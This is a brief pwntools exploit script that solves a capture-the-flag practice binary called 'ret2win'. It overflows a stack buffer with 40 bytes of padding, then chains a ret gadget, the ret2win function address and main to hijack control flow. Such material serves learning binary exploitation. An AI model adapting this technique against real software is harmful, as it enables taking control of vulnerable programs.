#!/usr/bin/env python3

from pwn import *

exe = './ret2win'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

io = process(exe)

ret = 0x000000000040053e

padding = 40

payload = flat(
    asm('nop')*padding,#padding to reach EIP
    ret,#ropper --file ret2win --search "ret"
    elf.symbols.ret2win, # Put address of ret2win in EIP
    elf.symbols.main, # return address of ret2win()
)

io.sendlineafter(b'>',payload)
io.interactive()
